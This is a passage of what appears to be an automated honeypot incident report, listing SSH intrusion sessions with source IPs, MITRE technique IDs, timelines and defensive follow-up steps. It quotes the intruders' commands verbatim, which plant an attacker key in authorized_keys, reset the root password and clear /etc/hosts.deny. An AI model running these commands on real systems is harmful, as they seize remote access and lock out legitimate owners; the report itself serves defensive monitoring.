| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:i82Xx5ITMxWQ"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 04:45:25` | `cowrie.session.connect` |
| `2026-05-30 04:45:25` | `cowrie.client.version` |
| `2026-05-30 04:45:25` | `cowrie.client.kex` |
| `2026-05-30 04:45:25` | `cowrie.login.success` |
| `2026-05-30 04:45:26` | `cowrie.session.params` |
| `2026-05-30 04:45:26` | `cowrie.command.input` |
| `2026-05-30 04:45:26` | `cowrie.command.failed` |
| `2026-05-30 04:45:26` | `cowrie.log.closed` |
| `2026-05-30 04:45:26` | `cowrie.session.params` |
| `2026-05-30 04:45:26` | `cowrie.command.input` |
| `2026-05-30 04:45:26` | `cowrie.session.file_download` |
| `2026-05-30 04:45:26` | `cowrie.log.closed` |
| `2026-05-30 04:45:38` | `cowrie.session.params` |
| `2026-05-30 04:45:38` | `cowrie.command.input` |
| `2026-05-30 04:45:39` | `cowrie.log.closed` |
| `2026-05-30 04:45:39` | `cowrie.session.params` |
| `2026-05-30 04:45:39` | `cowrie.command.input` |
| `2026-05-30 04:45:39` | `cowrie.log.closed` |
| `2026-05-30 04:45:39` | `cowrie.session.params` |
| `2026-05-30 04:45:39` | `cowrie.command.input` |
| `2026-05-30 04:45:39` | `cowrie.session.file_download` |
| `2026-05-30 04:45:39` | `cowrie.log.closed` |
| `2026-05-30 04:45:40` | `cowrie.session.params` |
| `2026-05-30 04:45:40` | `cowrie.command.input` |
| `2026-05-30 04:45:40` | `cowrie.log.closed` |
| `2026-05-30 04:45:40` | `cowrie.session.params` |
| `2026-05-30 04:45:40` | `cowrie.command.input` |
| `2026-05-30 04:45:40` | `cowrie.log.closed` |
| `2026-05-30 04:45:41` | `cowrie.session.params` |
| `2026-05-30 04:45:41` | `cowrie.command.input` |
| `2026-05-30 04:45:41` | `cowrie.command.input` |
| `2026-05-30 04:45:41` | `cowrie.log.closed` |
| `2026-05-30 04:45:41` | `cowrie.session.params` |
| `2026-05-30 04:45:41` | `cowrie.command.input` |
| `2026-05-30 04:45:41` | `cowrie.log.closed` |
| `2026-05-30 04:45:41` | `cowrie.session.params` |
| `2026-05-30 04:45:41` | `cowrie.command.input` |
| `2026-05-30 04:45:42` | `cowrie.log.closed` |
| `2026-05-30 04:45:42` | `cowrie.session.params` |
| `2026-05-30 04:45:42` | `cowrie.command.input` |
| `2026-05-30 04:45:42` | `cowrie.log.closed` |
| `2026-05-30 04:45:42` | `cowrie.session.params` |
| `2026-05-30 04:45:42` | `cowrie.command.input` |
| `2026-05-30 04:45:42` | `cowrie.log.closed` |
| `2026-05-30 04:45:43` | `cowrie.session.params` |
| `2026-05-30 04:45:43` | `cowrie.command.input` |
| `2026-05-30 04:45:43` | `cowrie.log.closed` |
| `2026-05-30 04:45:43` | `cowrie.session.params` |
| `2026-05-30 04:45:43` | `cowrie.command.input` |
| `2026-05-30 04:45:43` | `cowrie.log.closed` |
| `2026-05-30 04:45:44` | `cowrie.session.params` |
| `2026-05-30 04:45:44` | `cowrie.command.input` |
| `2026-05-30 04:45:44` | `cowrie.log.closed` |
| `2026-05-30 04:45:44` | `cowrie.session.params` |
| `2026-05-30 04:45:44` | `cowrie.command.input` |
| `2026-05-30 04:45:44` | `cowrie.log.closed` |
| `2026-05-30 04:45:44` | `cowrie.session.params` |
| `2026-05-30 04:45:44` | `cowrie.command.input` |
| `2026-05-30 04:45:45` | `cowrie.log.closed` |
| `2026-05-30 04:45:45` | `cowrie.session.params` |
| `2026-05-30 04:45:45` | `cowrie.command.input` |
| `2026-05-30 04:45:45` | `cowrie.log.closed` |
| `2026-05-30 04:45:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.87.97[.]159` to AbuseIPDB if not already reported
- [ ] Block `194.87.97[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9096a5bde65c

| Field | Detail |
|---|---|
| **Source IP** | `79.36.191[.]212` |
| **First Seen** | 2026-05-30 04:55 |
| **Last Seen** | 2026-05-30 04:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 04:55:02` | `cowrie.session.connect` |
| `2026-05-30 04:55:02` | `cowrie.client.version` |
| `2026-05-30 04:55:02` | `cowrie.client.kex` |
| `2026-05-30 04:55:03` | `cowrie.login.success` |
| `2026-05-30 04:55:03` | `cowrie.session.params` |
| `2026-05-30 04:55:03` | `cowrie.command.input` |
| `2026-05-30 04:55:03` | `cowrie.command.failed` |
| `2026-05-30 04:55:03` | `cowrie.log.closed` |
| `2026-05-30 04:55:04` | `cowrie.session.params` |
| `2026-05-30 04:55:04` | `cowrie.command.input` |
| `2026-05-30 04:55:04` | `cowrie.session.file_download` |
| `2026-05-30 04:55:04` | `cowrie.log.closed` |
| `2026-05-30 04:55:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.36.191[.]212` to AbuseIPDB if not already reported
- [ ] Block `79.36.191[.]212` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8267d2df9753

| Field | Detail |
|---|---|
| **Source IP** | `194.87.97[.]159` |
| **First Seen** | 2026-05-30 04:55 |
| **Last Seen** | 2026-05-30 04:55 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 04:55:05` | `cowrie.session.connect` |
| `2026-05-30 04:55:05` | `cowrie.client.version` |
| `2026-05-30 04:55:05` | `cowrie.client.kex` |
| `2026-05-30 04:55:06` | `cowrie.login.success` |
| `2026-05-30 04:55:06` | `cowrie.session.params` |
| `2026-05-30 04:55:06` | `cowrie.command.input` |
| `2026-05-30 04:55:06` | `cowrie.command.failed` |
| `2026-05-30 04:55:06` | `cowrie.log.closed` |
| `2026-05-30 04:55:07` | `cowrie.session.params` |
| `2026-05-30 04:55:07` | `cowrie.command.input` |
| `2026-05-30 04:55:07` | `cowrie.session.file_download` |
| `2026-05-30 04:55:07` | `cowrie.log.closed` |
| `2026-05-30 04:55:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.87.97[.]159` to AbuseIPDB if not already reported
- [ ] Block `194.87.97[.]159` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02c5ed14c60a

| Field | Detail |
|---|---|
| **Source IP** | `79.36.191[.]212` |
| **First Seen** | 2026-05-30 04:55 |
| **Last Seen** | 2026-05-30 04:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 04:55:06` | `cowrie.session.connect` |
| `2026-05-30 04:55:06` | `cowrie.client.version` |
| `2026-05-30 04:55:06` | `cowrie.client.kex` |
| `2026-05-30 04:55:06` | `cowrie.login.success` |
| `2026-05-30 04:55:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.36.191[.]212` to AbuseIPDB if not already reported
- [ ] Block `79.36.191[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a5f3981e2f8

| Field | Detail |
|---|---|
| **Source IP** | `194.87.97[.]159` |
| **First Seen** | 2026-05-30 04:55 |
| **Last Seen** | 2026-05-30 04:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 04:55:16` | `cowrie.session.connect` |
| `2026-05-30 04:55:16` | `cowrie.client.version` |
| `2026-05-30 04:55:16` | `cowrie.client.kex` |
| `2026-05-30 04:55:17` | `cowrie.login.success` |
| `2026-05-30 04:55:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `194.87.97[.]159` to AbuseIPDB if not already reported
- [ ] Block `194.87.97[.]159` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d48ee692f58

| Field | Detail |
|---|---|
| **Source IP** | `37.143.61[.]4` |
| **First Seen** | 2026-05-30 04:57 |
| **Last Seen** | 2026-05-30 04:57 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 04:57:26` | `cowrie.session.connect` |
| `2026-05-30 04:57:26` | `cowrie.client.version` |
| `2026-05-30 04:57:27` | `cowrie.client.kex` |
| `2026-05-30 04:57:27` | `cowrie.login.success` |
| `2026-05-30 04:57:28` | `cowrie.session.params` |
| `2026-05-30 04:57:28` | `cowrie.command.input` |
| `2026-05-30 04:57:28` | `cowrie.command.failed` |
| `2026-05-30 04:57:28` | `cowrie.log.closed` |
| `2026-05-30 04:57:29` | `cowrie.session.params` |
| `2026-05-30 04:57:29` | `cowrie.command.input` |
| `2026-05-30 04:57:29` | `cowrie.session.file_download` |
| `2026-05-30 04:57:29` | `cowrie.log.closed` |
| `2026-05-30 04:57:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.143.61[.]4` to AbuseIPDB if not already reported
- [ ] Block `37.143.61[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfdf10275cfa

| Field | Detail |
|---|---|
| **Source IP** | `37.143.61[.]4` |
| **First Seen** | 2026-05-30 04:57 |
| **Last Seen** | 2026-05-30 04:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 04:57:31` | `cowrie.session.connect` |
| `2026-05-30 04:57:31` | `cowrie.client.version` |
| `2026-05-30 04:57:32` | `cowrie.client.kex` |
| `2026-05-30 04:57:32` | `cowrie.login.success` |
| `2026-05-30 04:57:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `37.143.61[.]4` to AbuseIPDB if not already reported
- [ ] Block `37.143.61[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b60ffd2c98d

| Field | Detail |
|---|---|
| **Source IP** | `197.199.224[.]52` |
| **First Seen** | 2026-05-30 05:01 |
| **Last Seen** | 2026-05-30 05:01 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 05:01:46` | `cowrie.session.connect` |
| `2026-05-30 05:01:46` | `cowrie.client.version` |
| `2026-05-30 05:01:46` | `cowrie.client.kex` |
| `2026-05-30 05:01:47` | `cowrie.login.success` |
| `2026-05-30 05:01:47` | `cowrie.session.params` |
| `2026-05-30 05:01:47` | `cowrie.command.input` |
| `2026-05-30 05:01:47` | `cowrie.command.failed` |
| `2026-05-30 05:01:48` | `cowrie.log.closed` |
| `2026-05-30 05:01:48` | `cowrie.session.params` |
| `2026-05-30 05:01:48` | `cowrie.command.input` |
| `2026-05-30 05:01:48` | `cowrie.session.file_download` |
| `2026-05-30 05:01:48` | `cowrie.log.closed` |
| `2026-05-30 05:01:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.199.224[.]52` to AbuseIPDB if not already reported
- [ ] Block `197.199.224[.]52` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ea9a985db5d

| Field | Detail |
|---|---|
| **Source IP** | `197.199.224[.]52` |
| **First Seen** | 2026-05-30 05:01 |
| **Last Seen** | 2026-05-30 05:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 05:01:51` | `cowrie.session.connect` |
| `2026-05-30 05:01:51` | `cowrie.client.version` |
| `2026-05-30 05:01:51` | `cowrie.client.kex` |
| `2026-05-30 05:01:52` | `cowrie.login.success` |
| `2026-05-30 05:01:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.199.224[.]52` to AbuseIPDB if not already reported
- [ ] Block `197.199.224[.]52` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8aef3bd51653

| Field | Detail |
|---|---|
| **Source IP** | `197.199.224[.]52` |
| **First Seen** | 2026-05-30 05:09 |
| **Last Seen** | 2026-05-30 05:09 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 05:09:40` | `cowrie.session.connect` |
| `2026-05-30 05:09:40` | `cowrie.client.version` |
| `2026-05-30 05:09:40` | `cowrie.client.kex` |
| `2026-05-30 05:09:41` | `cowrie.login.success` |
| `2026-05-30 05:09:41` | `cowrie.session.params` |
| `2026-05-30 05:09:41` | `cowrie.command.input` |
| `2026-05-30 05:09:41` | `cowrie.command.failed` |
| `2026-05-30 05:09:42` | `cowrie.log.closed` |
| `2026-05-30 05:09:42` | `cowrie.session.params` |
| `2026-05-30 05:09:42` | `cowrie.command.input` |
| `2026-05-30 05:09:42` | `cowrie.session.file_download` |
| `2026-05-30 05:09:42` | `cowrie.log.closed` |
| `2026-05-30 05:09:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.199.224[.]52` to AbuseIPDB if not already reported
- [ ] Block `197.199.224[.]52` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-39b9a2d23e53

| Field | Detail |
|---|---|
| **Source IP** | `197.199.224[.]52` |
| **First Seen** | 2026-05-30 05:09 |
| **Last Seen** | 2026-05-30 05:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 05:09:45` | `cowrie.session.connect` |
| `2026-05-30 05:09:45` | `cowrie.client.version` |
| `2026-05-30 05:09:45` | `cowrie.client.kex` |
| `2026-05-30 05:09:46` | `cowrie.login.success` |
| `2026-05-30 05:09:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.199.224[.]52` to AbuseIPDB if not already reported
- [ ] Block `197.199.224[.]52` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a976d0120beb

| Field | Detail |
|---|---|
| **Source IP** | `112.119.21[.]245` |
| **First Seen** | 2026-05-30 05:10 |
| **Last Seen** | 2026-05-30 05:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 05:10:14` | `cowrie.session.connect` |
| `2026-05-30 05:10:14` | `cowrie.client.version` |
| `2026-05-30 05:10:14` | `cowrie.client.kex` |
| `2026-05-30 05:10:15` | `cowrie.login.success` |
| `2026-05-30 05:10:15` | `cowrie.session.params` |
| `2026-05-30 05:10:15` | `cowrie.command.input` |
| `2026-05-30 05:10:15` | `cowrie.command.failed` |
| `2026-05-30 05:10:16` | `cowrie.log.closed` |
| `2026-05-30 05:10:16` | `cowrie.session.params` |
| `2026-05-30 05:10:16` | `cowrie.command.input` |
| `2026-05-30 05:10:16` | `cowrie.session.file_download` |
| `2026-05-30 05:10:16` | `cowrie.log.closed` |
| `2026-05-30 05:10:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.119.21[.]245` to AbuseIPDB if not already reported
- [ ] Block `112.119.21[.]245` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48426addcba7

| Field | Detail |
|---|---|
| **Source IP** | `112.119.21[.]245` |
| **First Seen** | 2026-05-30 05:10 |
| **Last Seen** | 2026-05-30 05:10 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 05:10:18` | `cowrie.session.connect` |
| `2026-05-30 05:10:18` | `cowrie.client.version` |
| `2026-05-30 05:10:18` | `cowrie.client.kex` |
| `2026-05-30 05:10:19` | `cowrie.login.success` |
| `2026-05-30 05:10:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.119.21[.]245` to AbuseIPDB if not already reported
- [ ] Block `112.119.21[.]245` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fbc953b2d83

| Field | Detail |
|---|---|
| **Source IP** | `197.199.224[.]52` |
| **First Seen** | 2026-05-30 05:12 |
| **Last Seen** | 2026-05-30 05:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-30 05:12:29` | `cowrie.session.connect` |
| `2026-05-30 05:12:29` | `cowrie.client.version` |
| `2026-05-30 05:12:29` | `cowrie.client.kex` |
| `2026-05-30 05:12:30` | `cowrie.login.success` |
| `2026-05-30 05:12:31` | `cowrie.session.params` |
| `2026-05-30 05:12:31` | `cowrie.command.input` |
| `2026-05-30 05:12:31` | `cowrie.command.failed` |
| `2026-05-30 05:12:31` | `cowrie.log.closed` |
| `2026-05-30 05:12:31` | `cowrie.session.params` |
| `2026-05-30 05:12:31` | `cowrie.command.input` |
| `2026-05-30 05:12:32` | `cowrie.session.file_download` |
| `2026-05-30 05:12:32` | `cowrie.log.closed` |
| `2026-05-30 05:12:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.199.224[.]52` to AbuseIPDB if not already reported
- [ ] Block `197.199.224[.]52` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6feb70e10378

| Field | Detail |
|---|---|
| **Source IP** | `197.199.224[.]52` |
| **First Seen** | 2026-05-30 05:12 |
| **Last Seen** | 2026-05-30 05:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
